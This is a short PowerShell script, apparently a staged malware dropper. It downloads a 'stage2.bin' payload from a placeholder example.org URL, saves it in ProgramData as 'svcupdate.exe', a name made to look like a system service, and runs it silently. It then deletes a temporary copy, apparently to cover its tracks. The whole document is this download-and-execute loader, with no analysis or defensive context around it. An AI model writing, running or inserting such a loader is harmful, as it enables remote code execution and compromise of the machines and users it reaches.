
[CmdletBinding()]
param(
    [string]$Stage1Url = 'https://example.org/cdn/stage2.bin',
    [string]$LocalPath = 'C:\ProgramData\svcupdate.exe'
)
(New-Object System.Net.WebClient).DownloadFile($Stage1Url, $LocalPath)
Start-Process -FilePath $LocalPath -ErrorAction SilentlyContinue
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
